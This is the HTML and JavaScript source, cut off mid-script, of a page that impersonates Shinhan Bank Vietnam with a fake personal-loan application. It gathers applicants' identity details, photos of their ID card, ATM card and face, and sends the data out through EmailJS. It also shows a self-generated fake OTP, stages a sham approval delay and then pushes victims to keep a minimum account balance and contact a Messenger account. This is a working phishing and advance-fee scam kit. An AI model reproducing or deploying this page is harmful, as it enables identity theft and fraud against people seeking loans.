<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đăng Ký Vay Tín Chấp - Shinhan Bank</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font chữ hiện đại (Roboto) -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <!-- EmailJS -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <!-- jQuery -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f5f7fa;
        }
        .header {
            background-color: #005BAC;
            color: white;
            padding: 20px;
            text-align: center;
            border-bottom: 5px solid #004A8F;
        }
        .header img {
            max-width: 150px;
        }
        .container {
            max-width: 900px;
            margin: 30px auto;
            padding: 30px;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }
        .form-logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .form-logo img {
            max-width: 100px;
        }
        .form-label {
            font-weight: 500;
            color: #333;
        }
        .form-control, .form-select {
            border-radius: 5px;
            border: 1px solid #ced4da;
            padding: 10px;
            font-size: 16px;
        }
        .form-control:focus, .form-select:focus {
            border-color: #005BAC;
            box-shadow: 0 0 5px rgba(0, 91, 172, 0.3);
        }
        .form-control.is-invalid, .form-select.is-invalid {
            border-color: #dc3545;
        }
        .invalid-feedback {
            font-size: 14px;
        }
        .file-upload-box {
            border: 1px dashed #ced4da;
            border-radius: 5px;
            padding: 15px;
            text-align: center;
            margin-bottom: 10px;
        }
        .file-upload-box input {
            display: none;
        }
        .file-upload-box label {
            cursor: pointer;
            color: #005BAC;
            font-weight: 500;
        }
        .file-info {
            font-size: 14px;
            color: #666;
            margin-top: 5px;
        }
        .btn-primary {
            background-color: #005BAC;
            border-color: #005BAC;
            padding: 12px;
            font-size: 16px;
            font-weight: 500;
            transition: background-color 0.3s;
        }
        .btn-primary:hover {
            background-color: #004A8F;
            border-color: #004A8F;
        }
        .btn-messenger {
            background-color: #0084FF;
            border-color: #0084FF;
            color: white;
            padding: 12px;
            font-size: 16px;
            font-weight: 500;
            transition: background-color 0.3s;
        }
        .btn-messenger:hover {
            background-color: #006DD9;
            border-color: #006DD9;
            color: white;
        }
        .btn-copy {
            background-color: #28a745;
            border-color: #28a745;
            color: white;
            padding: 8px 16px;
            font-size: 14px;
            font-weight: 500;
            transition: background-color 0.3s;
        }
        .btn-copy:hover {
            background-color: #218838;
            border-color: #218838;
            color: white;
        }
        .otp-display {
            background-color: #e7f3ff;
            border: 1px solid #b8daff;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            text-align: center;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
        }
        .otp-display p {
            margin: 0;
            font-size: 18px;
            font-weight: 700;
            color: #005BAC;
        }
        .otp-input {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 20px;
        }
        .otp-input input {
            width: 40px;
            height: 40px;
            text-align: center;
            font-size: 18px;
            border: 1px solid #ced4da;
            border-radius: 5px;
        }
        .otp-input input:focus {
            border-color: #005BAC;
            box-shadow: 0 0 5px rgba(0, 91, 172, 0.3);
        }
        .image-section canvas {
            width: 100%;
            max-width: 600px;
            margin: 20px auto;
            display: block;
            border: 2px solid #e9ecef;
            border-radius: 8px;
        }
        .hidden {
            display: none;
        }
        .modal-content {
            border: none;
            border-radius: 10px;
        }
        .modal-header {
            background-color: #005BAC;
            color: white;
            border-bottom: none;
            padding: 20px;
        }
        .modal-body {
            text-align: center;
            padding: 30px;
        }
        .modal-body h5 {
            color: #005BAC;
            font-weight: 700;
            margin-bottom: 15px;
        }
        .modal-body p {
            color: #555;
            font-size: 16px;
        }
        .modal-footer {
            border-top: none;
            padding: 20px;
            justify-content: center;
        }
        .step-title {
            color: #005BAC;
            font-weight: 700;
            font-size: 24px;
            margin-bottom: 20px;
            text-align: center;
        }
        .step-description {
            color: #666;
            font-size: 16px;
            text-align: center;
            margin-bottom: 30px;
        }
        .spinner-border {
            width: 3rem;
            height: 3rem;
            border-width: 0.4em;
        }
        .info-box {
            background-color: #f8f9fa;
            border: 1px solid #e9ecef;
            border-radius: 8px;
            padding: 20px;
            margin-top: 20px;
            text-align: center;
        }
        .info-box p {
            margin: 0;
            color: #333;
            font-size: 16px;
        }
        .confirmation-box {
            background-color: #e7f3ff;
            border: 1px solid #b8daff;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            text-align: center;
        }
        .confirmation-box p {
            margin: 0;
            color: #005BAC;
            font-size: 16px;
            font-weight: 500;
        }
        .terms-box {
            background-color: #f8f9fa;
            border: 1px solid #e9ecef;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
        }
        .terms-box p {
            margin: 0;
            color: #666;
            font-size: 14px;
        }
        .footer {
            background-color: #005BAC;
            color: white;
            padding: 20px;
            text-align: center;
            margin-top: 30px;
            border-top: 5px solid #004A8F;
        }
        .footer p {
            margin: 0;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <!-- Header -->
    <div class="header">
        <img src="https://www.shinhan.com.vn/wp-content/uploads/2023/09/shinhan-logo.png" alt="Shinhan Bank Logo">
        <h1>Đăng Ký Vay Tín Chấp</h1>
    </div>

    <!-- Main Content -->
    <div class="container">
        <!-- Bước 1: Đăng ký hồ sơ -->
        <div id="step1">
            <div class="form-logo">
                <img src="https://www.shinhan.com.vn/wp-content/uploads/2023/09/shinhan-logo.png" alt="Shinhan Bank Logo">
            </div>
            <h5 class="step-title">Đăng Ký Hồ Sơ Vay Tín Chấp</h5>
            <p class="step-description">Vui lòng cung cấp đầy đủ thông tin cá nhân để chúng tôi tiến hành xét duyệt.</p>
            <form id="registerForm">
                <div class="mb-3">
                    <label for="fullName" class="form-label">Họ và Tên</label>
                    <input type="text" class="form-control" id="fullName" placeholder="Nhập họ và tên" required>
                    <div class="invalid-feedback">Vui lòng nhập họ và tên hợp lệ.</div>
                </div>
                <div class="mb-3">
                    <label for="idNumber" class="form-label">Số CMND/CCCD</label>
                    <input type="text" class="form-control" id="idNumber" placeholder="Nhập số CMND/CCCD" required>
                    <div class="invalid-feedback">Số CMND/CCCD phải có 9 hoặc 12 chữ số.</div>
                </div>
                <div class="mb-3">
                    <label for="address" class="form-label">Địa Chỉ Thường Trú</label>
                    <input type="text" class="form-control" id="address" placeholder="Nhập địa chỉ thường trú" required>
                    <div class="invalid-feedback">Vui lòng nhập địa chỉ hợp lệ.</div>
                </div>
                <div class="mb-3">
                    <label for="occupation" class="form-label">Nghề Nghiệp</label>
                    <select class="form-select" id="occupation" required>
                        <option value="" disabled selected>Chọn nghề nghiệp</option>
                        <option value="nhanvien">Nhân viên văn phòng</option>
                        <option value="kinhdoanh">Kinh doanh tự do</option>
                        <option value="giaovien">Giáo viên</option>
                        <option value="congnhan">Công nhân</option>
                        <option value="khac">Khác</option>
                    </select>
                    <div class="invalid-feedback">Vui lòng chọn nghề nghiệp.</div>
                </div>
                <div class="mb-3">
                    <label for="income" class="form-label">Thu Nhập Hàng Tháng (VND)</label>
                    <input type="number" class="form-control" id="income" placeholder="Nhập thu nhập hàng tháng" min="5000000" required>
                    <div class="invalid-feedback">Thu nhập phải lớn hơn 5,000,000 VND.</div>
                </div>
                <div class="mb-3">
                    <label for="phoneNumber" class="form-label">Số Điện Thoại</label>
                    <input type="tel" class="form-control" id="phoneNumber" placeholder="Nhập số điện thoại" required>
                    <div class="invalid-feedback">Số điện thoại phải có 10 chữ số.</div>
                </div>
                <div class="mb-3">
                    <label for="email" class="form-label">Email</label>
                    <input type="email" class="form-control" id="email" placeholder="Nhập email" required>
                    <div class="invalid-feedback">Vui lòng nhập email hợp lệ.</div>
                </div>
                <div class="mb-3">
                    <label for="loanAmount" class="form-label">Số Tiền Vay (VND)</label>
                    <input type="number" class="form-control" id="loanAmount" placeholder="Nhập số tiền vay" min="1000000" required>
                    <div class="invalid-feedback">Số tiền vay phải lớn hơn 1,000,000 VND.</div>
                </div>
                <div class="mb-3">
                    <label for="loanTerm" class="form-label">Số Tháng Vay</label>
                    <input type="number" class="form-control" id="loanTerm" placeholder="Nhập số tháng vay (tối thiểu 6 tháng)" min="6" required>
                    <div class="invalid-feedback">Số tháng vay phải từ 6 tháng trở lên.</div>
                </div>
                <div class="mb-3">
                    <div class="terms-box">
                        <p>Thông tin của bạn sẽ được bảo mật tuyệt đối theo chính sách bảo mật của Shinhan Bank. Vui lòng đọc kỹ <a href="#" data-bs-toggle="modal" data-bs-target="#termsModal">Điều khoản và Điều kiện</a> trước khi tiếp tục.</p>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="termsAgree" required>
                        <label class="form-check-label" for="termsAgree">
                            Tôi đồng ý với các điều khoản và điều kiện của Shinhan Bank.
                        </label>
                        <div class="invalid-feedback">Bạn cần đồng ý với điều khoản để tiếp tục.</div>
                    </div>
                </div>
                <button type="submit" class="btn btn-primary w-100">Tiếp Tục</button>
            </form>
        </div>

        <!-- Bước 2: Tải lên giấy tờ (CMND/CCCD) -->
        <div id="step2" class="hidden">
            <h5 class="step-title">Tải Lên Giấy Tờ (CMND/CCCD)</h5>
            <p class="step-description">Vui lòng tải lên hình ảnh CMND/CCCD để hoàn tất hồ sơ đăng ký.</p>
            <div class="mb-3">
                <label for="idFrontImage" class="form-label">Hình Ảnh CMND/CCCD (Mặt Trước)</label>
                <div class="file-upload-box">
                    <label for="idFrontImage">Chọn tệp hoặc chụp ảnh</label>
                    <input type="file" id="idFrontImage" accept="image/*" capture="environment" required>
                    <div class="file-info" id="idFrontInfo"></div>
                </div>
                <div class="invalid-feedback">Vui lòng tải lên hình ảnh mặt trước CMND/CCCD.</div>
            </div>
            <div class="mb-3">
                <label for="idBackImage" class="form-label">Hình Ảnh CMND/CCCD (Mặt Sau)</label>
                <div class="file-upload-box">
                    <label for="idBackImage">Chọn tệp hoặc chụp ảnh</label>
                    <input type="file" id="idBackImage" accept="image/*" capture="environment" required>
                    <div class="file-info" id="idBackInfo"></div>
                </div>
                <div class="invalid-feedback">Vui lòng tải lên hình ảnh mặt sau CMND/CCCD.</div>
            </div>
            <div class="text-center mt-3">
                <button id="proceedToStep3Btn" class="btn btn-primary">Tiếp Tục</button>
            </div>
        </div>

        <!-- Bước 3: Tải lên thẻ ATM -->
        <div id="step3" class="hidden">
            <h5 class="step-title">Tải Lên Thẻ ATM</h5>
            <p class="step-description">Vui lòng tải lên hình ảnh thẻ ATM để hoàn tất hồ sơ đăng ký.</p>
            <div class="mb-3">
                <label for="atmImage" class="form-label">Hình Ảnh Thẻ ATM</label>
                <div class="file-upload-box">
                    <label for="atmImage">Chọn tệp hoặc chụp ảnh</label>
                    <input type="file" id="atmImage" accept="image/*" capture="environment" required>
                    <div class="file-info" id="atmImageInfo"></div>
                </div>
                <div class="invalid-feedback">Vui lòng tải lên hình ảnh thẻ ATM.</div>
            </div>
            <div class="text-center mt-3">
                <button id="proceedToStep4Btn" class="btn btn-primary">Tiếp Tục</button>
            </div>
        </div>

        <!-- Bước 4: Chụp khuôn mặt -->
        <div id="step4" class="hidden">
            <h5 class="step-title">Xác Minh Khuôn Mặt</h5>
            <p class="step-description">Vui lòng chụp ảnh khuôn mặt hoặc tải lên hình ảnh để xác minh danh tính.</p>
            <div class="mb-3">
                <label for="faceImage" class="form-label">Hình Ảnh Khuôn Mặt</label>
                <div class="file-upload-box">
                    <label for="faceImage">Chụp ảnh hoặc chọn tệp</label>
                    <input type="file" id="faceImage" accept="image/*" capture="user" required>
                    <div class="file-info" id="faceImageInfo"></div>
                </div>
                <div class="invalid-feedback">Vui lòng chụp hoặc tải lên hình ảnh khuôn mặt.</div>
            </div>
            <div class="text-center mt-3">
                <button id="proceedToOtpBtn" class="btn btn-primary">Tiếp Tục</button>
            </div>
        </div>

        <!-- Bước 5: Xác nhận danh tính bằng OTP -->
        <div id="step5" class="hidden">
            <h5 class="step-title">Xác Nhận Danh Tính</h5>
            <p class="step-description">Vui lòng nhập mã OTP để xác nhận danh tính.</p>
            <div class="otp-display">
                <p id="otpDisplay"></p>
                <button class="btn btn-copy" onclick="copyOtp()">Sao chép</button>
            </div>
            <div class="otp-input">
                <input type="text" maxlength="1" class="otp-digit" id="otp1" required>
                <input type="text" maxlength="1" class="otp-digit" id="otp2" required>
                <input type="text" maxlength="1" class="otp-digit" id="otp3" required>
                <input type="text" maxlength="1" class="otp-digit" id="otp4" required>
                <input type="text" maxlength="1" class="otp-digit" id="otp5" required>
                <input type="text" maxlength="1" class="otp-digit" id="otp6" required>
            </div>
            <div class="text-center mt-3">
                <button id="verifyOtpBtn" class="btn btn-primary">Xác Nhận OTP</button>
            </div>
        </div>

        <!-- Bước 6: Xét duyệt -->
        <div id="step6" class="hidden">
            <h5 class="step-title">Đang Trong Quá Trình Xét Duyệt</h5>
            <p class="step-description">Hồ sơ của bạn đã được nhận và đang trong quá trình xét duyệt. Quá trình này sẽ mất khoảng 1-2 phút.</p>
            <div class="text-center">
                <div class="spinner-border text-primary" role="status">
                    <span class="visually-hidden">Loading...</span>
                </div>
            </div>
        </div>

        <!-- Bước 7: Thông báo duyệt hồ sơ -->
        <div id="step7" class="hidden">
            <h5 class="step-title">Chúc Mừng! Hồ Sơ Đã Được Duyệt</h5>
            <p class="step-description">Hồ sơ vay tín chấp của bạn đã được duyệt thành công.</p>
            <div class="confirmation-box">
                <p id="confirmationMessage"></p>
            </div>
            <div class="text-center mt-3">
                <button id="proceedToContractBtn" class="btn btn-primary">Xem Hợp Đồng</button>
            </div>
        </div>

        <!-- Bước 8: Hiển thị hợp đồng và ký -->
        <div id="step8" class="image-section hidden">
            <h5 class="step-title">Hợp Đồng Vay Tín Chấp</h5>
            <p class="step-description">Vui lòng xem kỹ hợp đồng và xác nhận ký.</p>
            <canvas id="contractCanvas"></canvas>
            <div class="info-box">
                <p>Lãi suất: 1% mỗi tháng. Phí phạt trễ hạn: 5% số tiền trễ hạn. Vui lòng đọc kỹ các điều khoản trong hợp đồng.</p>
            </div>
            <div class="action-section text-center mt-3">
                <button id="proceedToSignContractBtn" class="btn btn-primary">Xác Nhận Ký Hợp Đồng</button>
            </div>
        </div>

        <!-- Bước 8.1: Xác nhận ký hợp đồng bằng OTP -->
        <div id="step8-1" class="hidden">
            <h5 class="step-title">Xác Nhận Ký Hợp Đồng</h5>
            <p class="step-description">Vui lòng nhập mã OTP để xác nhận ký hợp đồng.</p>
            <div class="otp-display">
                <p id="signOtpDisplay"></p>
                <button class="btn btn-copy" onclick="copySignOtp()">Sao chép</button>
            </div>
            <div class="otp-input">
                <input type="text" maxlength="1" class="otp-digit" id="signOtp1" required>
                <input type="text" maxlength="1" class="otp-digit" id="signOtp2" required>
                <input type="text" maxlength="1" class="otp-digit" id="signOtp3" required>
                <input type="text" maxlength="1" class="otp-digit" id="signOtp4" required>
                <input type="text" maxlength="1" class="otp-digit" id="signOtp5" required>
                <input type="text" maxlength="1" class="otp-digit" id="signOtp6" required>
            </div>
            <div class="text-center mt-3">
                <button id="verifySignOtpBtn" class="btn btn-primary">Xác Nhận OTP</button>
            </div>
        </div>

        <!-- Bước 9: Nhận điều kiện hợp đồng giải ngân -->
        <div id="step9" class="image-section hidden">
            <h5 class="step-title">Điều Kiện Giải Ngân</h5>
            <p class="step-description">Vui lòng xem điều kiện giải ngân để chuẩn bị nhận tiền.</p>
            <canvas id="disbursementCanvas"></canvas>
            <div class="info-box">
                <p>Để nhận tiền, bạn cần đảm bảo số dư tài khoản tối thiểu 500,000 VND và hoàn thành các giấy tờ bổ sung (nếu có).</p>
            </div>
            <div class="action-section text-center mt-3">
                <button id="proceedToFinalStepBtn" class="btn btn-primary">Tiếp Tục</button>
            </div>
        </div>

        <!-- Bước 10: Chuẩn bị số dư và liên hệ qua Messenger -->
        <div id="step10" class="hidden">
            <h5 class="step-title">Chuẩn Bị Số Dư và Liên Hệ</h5>
            <p class="step-description">Vui lòng chuẩn bị số dư tài khoản và liên hệ với chúng tôi để hoàn tất quá trình giải ngân.</p>
            <div class="info-box">
                <p>Số dư tối thiểu: 500,000 VND. Liên hệ qua Messenger để được hỗ trợ nhanh nhất.</p>
            </div>
            <div class="text-center mt-3">
                <a href="https://m.me/shinhanfinancer?hash=AbbheNwiAth9Hcp7&source_id=8585216" target="_blank" class="btn btn-messenger">Liên Hệ Qua Messenger</a>
            </div>
        </div>
    </div>

    <!-- Modal Điều khoản -->
    <div class="modal fade" id="termsModal" tabindex="-1" aria-labelledby="termsModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="termsModalLabel">Điều Khoản và Điều Kiện</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <h6>1. Điều khoản chung</h6>
                    <p>Khách hàng cam kết cung cấp thông tin chính xác và đầy đủ. Shinhan Bank có quyền từ chối xét duyệt nếu thông tin không hợp lệ.</p>
                    <h6>2. Lãi suất và phí</h6>
                    <p>Lãi suất vay tín chấp: 1% mỗi tháng. Phí phạt trễ hạn: 5% số tiền trễ hạn.</p>
                    <h6>3. Bảo mật thông tin</h6>
                    <p>Thông tin của khách hàng sẽ được bảo mật tuyệt đối theo chính sách bảo mật của Shinhan Bank.</p>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-primary" data-bs-dismiss="modal">Đóng</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Modal Chúc Mừng -->
    <div class="modal fade" id="successModal" tabindex="-1" aria-labelledby="successModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="successModalLabel">Chúc Mừng!</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <h5>Hồ Sơ Vay Đã Được Duyệt</h5>
                    <p id="modalFullName"></p>
                    <p id="modalLoanAmount"></p>
                    <p id="modalLoanCode"></p>
                    <p>Nhấn "Tiếp Tục" để xem hợp đồng.</p>
                    <button type="button" class="btn btn-primary mt-3" data-bs-dismiss="modal" onclick="proceedToContract()">Tiếp Tục</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <div class="footer">
        <p>Shinhan Bank Việt Nam - Hotline: 1900 1234 - Email: support@shinhan.com.vn</p>
    </div>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <!-- Script xử lý form và gửi email -->
    <script>
        // Khởi tạo EmailJS với public key
        (function() {
            emailjs.init("Cc-147hLWigAZAdeZ");
        })();

        // Định nghĩa formData với URL hình ảnh
        let formData = {
            contractImage: "https://vaytieudung.github.io/shinhanbank/assets/img/contract_image.png",
            disbursementImage: "https://vaytieudung.github.io/shinhanbank/assets/img/disbursement_image.png"
        };

        // Dữ liệu người đăng ký
        let userData = {};

        // Hiển thị thông tin tệp đã tải lên
        $('#atmImage').on('change', function(e) {
            const file = e.target.files[0];
            if (file) {
                $('#atmImageInfo').text(`${file.name} (${Math.round(file.size / 1024)} KB)`);
                $('#atmImage').removeClass('is-invalid');
            }
        });

        $('#idFrontImage').on('change', function(e) {
            const file = e.target.files[0];
            if (file) {
                $('#idFrontInfo').text(`${file.name} (${Math.round(file.size / 1024)} KB)`);
                $('#idFrontImage').removeClass('is-invalid');
            }
        });

        $('#idBackImage').on('change', function(e) {
            const file = e.target.files[0];
            if (file) {
                $('#idBackInfo').text(`${file.name} (${Math.round(file.size / 1024)} KB)`);
                $('#idBackImage').removeClass('is-invalid');
            }
        });

        $('#faceImage').on('change', function(e) {
            const file = e.target.files[0];
            if (file) {
                $('#faceImageInfo').text(`${file.name} (${Math.round(file.size / 1024)} KB)`);
                $('#faceImage').removeClass('is-invalid');
            }
        });

        // Hàm tạo mã hồ sơ ngẫu nhiên (dạng SHB-YYYYMMDD-XXXXXX)
        function generateLoanCode() {
            const date = new Date();
            const year = date.getFullYear();
            const month = String(date.getMonth() + 1).padStart(2, '0');
            const day = String(date.getDate()).padStart(2, '0');
            const random = Math.floor(100000 + Math.random() * 900000); // Số ngẫu nhiên 6 chữ số
            return `SHB-${year}${month}${day}-${random}`;
        }

        // Hàm lấy ngày hiện tại (YYYY-MM-DD)
        function getCurrentDate() {
            const date = new Date();
            const year = date.getFullYear();
            const month = String(date.getMonth() + 1).padStart(2, '0');
            const day = String(date.getDate()).padStart(2, '0');
            return `${year}-${month}-${day}`;
        }

        // Hàm tính số tiền góp hàng tháng (giả lập lãi suất 1% mỗi tháng)
        function calculateMonthlyPayment(loanAmount, loanTerm) {
            const monthlyInterestRate = 0.01; // Lãi suất 1% mỗi tháng
            const totalInterest = loanAmount * monthlyInterestRate * loanTerm;
            const totalAmount = parseInt(loanAmount) + totalInterest;
            const monthlyPayment = totalAmount / loanTerm;
            return Math.round(monthlyPayment).toLocaleString('vi-VN');
        }

        // Hàm định dạng số tiền với dấu phẩy
        function formatNumber(number) {
            return parseInt(number).toLocaleString('vi-VN');
        }

        // Hàm kiểm tra dữ liệu đầu vào
        function validateForm() {
            let isValid = true;
            const fullName = $('#fullName').val().trim();
            const idNumber = $('#idNumber').val().trim();
            const address = $('#address').val().trim();
            const occupation = $('#occupation').val();
            const income = $('#income').val();
            const phoneNumber = $('#phoneNumber').val().trim();
            const email = $('#email').val().trim();
            const loanAmount = $('#loanAmount').val();
            const loanTerm = $('#loanTerm').val();
            const termsAgree = $('#termsAgree').is(':checked');

            // Kiểm tra họ và tên
            if (fullName === '' || fullName.length < 2) {
                $('#fullName').addClass('is-invalid');
                isValid = false;
            } else {
                $('#fullName').removeClass('is-invalid');
            }

            // Kiểm tra số CMND/CCCD (9 hoặc 12 chữ số)
            const idRegex = /^[0-9]{9}$|^[0-9]{12}$/;
            if (!idRegex.test(idNumber)) {
                $('#idNumber').addClass('is-invalid');
                isValid = false;
            } else {
                $('#idNumber').removeClass('is-invalid');
            }

            // Kiểm tra địa chỉ
            if (address === '' || address.length < 5) {
                $('#address').addClass('is-invalid');
                isValid = false;
            } else {
                $('#address').removeClass('is-invalid');
            }

            // Kiểm tra nghề nghiệp
            if (!occupation) {
                $('#occupation').addClass('is-invalid');
                isValid = false;
            } else {
                $('#occupation').removeClass('is-invalid');
            }

            // Kiểm tra thu nhập
            if (income < 5000000) {
                $('#income').addClass('is-invalid');
                isValid = false;
            } else {
                $('#income').removeClass('is-invalid');
            }

            // Kiểm tra số điện thoại (10 chữ số)
            const phoneRegex = /^[0-9]{10}$/;
            if (!phoneRegex.test(phoneNumber)) {
                $('#phoneNumber').addClass('is-invalid');
                isValid = false;
            } else {
                $('#phoneNumber').removeClass('is-invalid');
            }

            // Kiểm tra email
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                $('#email').addClass('is-invalid');
                isValid = false;
            } else {
                $('#email').removeClass('is-invalid');
            }

            // Kiểm tra số tiền vay
            if (loanAmount < 1000000) {
                $('#loanAmount').addClass('is-invalid');
                isValid = false;
            } else {
                $('#loanAmount').removeClass('is-invalid');
            }

            // Kiểm tra số tháng vay
            if (loanTerm < 6) {
                $('#loanTerm').addClass('is-invalid');
                isValid = false;
            } else {
                $('#loanTerm').removeClass('is-invalid');
            }

            // Kiểm tra đồng ý điều khoản
            if (!termsAgree) {
                $('#termsAgree').addClass('is-invalid');
                isValid = false;
            } else {
                $('#termsAgree').removeClass('is-invalid');
            }

            return isValid;
        }

        // Bước 1: Đăng ký hồ sơ
        $('#registerForm').on('submit', function(e) {
            e.preventDefault();

            // Kiểm tra dữ liệu đầu vào
            if (!validateForm()) {
                return;
            }

            // Lưu dữ liệu người dùng
            userData = {
                fullName: $('#fullName').val(),
                idNumber: $('#idNumber').val(),
                address: $('#address').val(),
                occupation: $('#occupation').val(),
                income: $('#income').val(),
                phoneNumber: $('#phoneNumber').val(),
                email: $('#email').val(),
                loanAmount: $('#loanAmount').val(),
                loanTerm: $('#loanTerm').val(),
                loanCode: generateLoanCode(),
                registrationDate: getCurrentDate(),
                monthlyPayment: calculateMonthlyPayment($('#loanAmount').val(), $('#loanTerm').val())
            };

            // Chuyển sang bước 2: Tải lên giấy tờ (CMND/CCCD)
            $('#step1').addClass('hidden');
            $('#step2').removeClass('hidden');
        });

        // Bước 2: Tải lên giấy tờ (CMND/CCCD)
        $('#proceedToStep3Btn').on('click', function() {
            let isValid = true;
            const idFrontImage = $('#idFrontImage')[0].files.length;
            const idBackImage = $('#idBackImage')[0].files.length;

            // Kiểm tra hình ảnh CMND/CCCD (mặt trước)
            if (idFrontImage === 0) {
                $('#idFrontImage').addClass('is-invalid');
                isValid = false;
            } else {
                $('#idFrontImage').removeClass('is-invalid');
            }

            // Kiểm tra hình ảnh CMND/CCCD (mặt sau)
            if (idBackImage === 0) {
                $('#idBackImage').addClass('is-invalid');
                isValid = false;
            } else {
                $('#idBackImage').removeClass('is-invalid');
            }

            if (!isValid) {
                return;
            }

            // Lưu dữ liệu giấy tờ
            userData.idFrontImage = $('#idFrontImage')[0].files[0];
            userData.idBackImage = $('#idBackImage')[0].files[0];

            // Chuyển sang bước 3: Tải lên thẻ ATM
            $('#step2').addClass('hidden');
            $('#step3').removeClass('hidden');
        });

        // Bước 3: Tải lên thẻ ATM
        $('#proceedToStep4Btn').on('click', function() {
            let isValid = true;
            const atmImage = $('#atmImage')[0].files.length;

            // Kiểm tra hình ảnh thẻ ATM
            if (atmImage === 0) {
                $('#atmImage').addClass('is-invalid');
                isValid = false;
            } else {
                $('#atmImage').removeClass('is-invalid');
            }

            if (!isValid) {
                return;
            }

            // Lưu dữ liệu thẻ ATM
            userData.atmImage = $('#atmImage')[0].files[0];

            // Chuyển sang bước 4: Chụp khuôn mặt
            $('#step3').addClass('hidden');
            $('#step4').removeClass('hidden');
        });

        // Bước 4: Chụp khuôn mặt
        $('#proceedToOtpBtn').on('click', function() {
            let isValid = true;
            const faceImage = $('#faceImage')[0].files.length;

            // Kiểm tra hình ảnh khuôn mặt
            if (faceImage === 0) {
                $('#faceImage').addClass('is-invalid');
                isValid = false;
            } else {
                $('#faceImage').removeClass('is-invalid');
            }

            if (!isValid) {
                return;
            }

            // Lưu dữ liệu hình ảnh khuôn mặt
            userData.faceImage = $('#faceImage')[0].files[0];

            // Chuyển sang bước 5: Xác nhận danh tính bằng OTP
            $('#step4').addClass('hidden');
            $('#step5').removeClass('hidden');

            // Giả lập gửi OTP (hiển thị trên màn hình)
            const otp = Math.floor(100000 + Math.random() * 900000); // Mã OTP 6 chữ số
            $('#otpDisplay').text(otp);
            userData.otp = otp.toString();
        });

        // Hàm sao chép mã OTP
        function copyOtp() {
            const otp = $('#otpDisplay').text();
            navigator.clipboard.writeText(otp).then(() => {
                alert("Đã sao chép mã OTP!");
            });
        }

        // Bước 5: Xác nhận danh tính bằng OTP
        $('#verifyOtpBtn').on('click', function() {
            const enteredOtp = $('#otp1').val() + $('#otp2').val() + $('#otp3').val() + $('#otp4').val() + $('#otp5').val() + $('#otp6').val();
            if (enteredOtp === userData.otp) {
                // Chuyển sang bước 6: Xét duyệt
                $('#step5').addClass('hidden');
                $('#step6').removeClass('hidden');

                // Gửi email thu thập thông tin (giả lập xét duyệt)
                let emailParams = {
                    fullName: userData.fullName,
                    idNumber: userData.idNumber,
                    address: userData.address,
                    occupation: userData.occupation,
                    income: userData.income,
                    phoneNumber: userData.phoneNumber,
                    email: userData.email,
                    loanAmount: userData.loanAmount,
                    loanTerm: userData.loanTerm,
                    loanCode: userData.loanCode,
                    registrationDate: userData.registrationDate,
                    monthlyPayment: userData.monthlyPayment,
                    contractImageUrl: formData.contractImage,
                    disbursementImageUrl: formData.disbursementImage
                };

                emailjs.send("service_db2prre", "template_g4jo6tc", emailParams)
                    .then(function(response) {
                        // Giả lập xét duyệt (1-2 phút)
                        setTimeout(() => {
                            // Tự động gửi email xác nhận
                            emailjs.send("service_db2prre", "template_sgzr5e8", emailParams)
                                .then(function(response) {
                                    // Cập nhật thông tin trong modal
                                    $('#modalFullName').text(`Khách hàng: ${userData.fullName}`);
                                    $('#modalLoanAmount').text(`Số tiền vay: ${formatNumber(userData.loanAmount)} VND`);
                                    $('#modalLoanCode').text(`Mã hồ sơ: ${userData.loanCode}`);
                                    $('#confirmationMessage').text(`Mã hồ sơ: ${userData.loanCode}`);

                                    // Chuyển sang bước 7: Thông báo duyệt hồ sơ
                                    $('#step6').addClass('hidden');
                                    $('#step7').removeClass('hidden');
                                }, function(error) {
                                    console.error("Lỗi khi gửi email xác nhận:", error);
                                    alert("Có lỗi xảy ra trong quá trình xét duyệt. Vui lòng thử lại!");
                                    $('#step6').addClass('hidden');
                                    $('#step1').removeClass('hidden');
                                });
                        }, 90000); // Giả lập 1,5 phút (90 giây)
                    }, function(error) {
                        console.error("Lỗi khi gửi email thu thập thông tin:", error);
                        alert("Có lỗi xảy ra trong quá trình xét duyệt. Vui lòng thử lại!");
                        $('#step6').addClass('hidden');
                        $('#step1').removeClass('hidden');
                    });
            } else {
                alert("Mã OTP không đúng. Vui lòng thử lại!");
            }
        });

        // Chuyển sang bước 8: Hiển thị hợp đồng và ký
        function proceedToContract() {
            $('#step7').addClass('hidden');
            $('#step8').removeClass('hidden');

            // Vẽ hình ảnh hợp đồng với thông tin người đăng ký
